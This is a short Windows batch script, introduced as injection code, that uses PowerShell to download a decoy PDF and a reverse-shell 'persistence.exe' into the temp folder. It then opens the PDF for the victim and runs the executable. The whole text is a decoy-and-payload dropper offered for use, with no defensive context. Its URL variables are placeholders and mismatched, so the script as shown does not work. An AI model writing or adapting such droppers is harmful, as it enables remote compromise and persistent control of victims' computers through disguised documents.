
The injection code in order to pull down the needed files
@echo off
:: Define the URLs and output file paths
:: Downloads actual PDF 
:: Launch for attackee
set pdf= GIT PDF 
set OUTPUT1=%TEMP%\SliBuy.pdf

set exploit=GIT Reverse shell
set OUTPUT2=%TEMP%\persistence.exe


:: Download the first file using PowerShell
echo Downloading PDF...
powershell -Command "Invoke-WebRequest -Uri '%URL1%' -OutFile '%OUTPUT1%'"

:: Download the second file using PowerShell
echo Downloading Persistence...
powershell -Command "Invoke-WebRequest -Uri '%URL2%' -OutFile '%OUTPUT2%'"

:: Execute the downloaded files
echo Executing PDF...
start "" "%OUTPUT1%"

echo Executing Persistence...
start "" "%OUTPUT2%"
:: Pause to keep the command window open for review
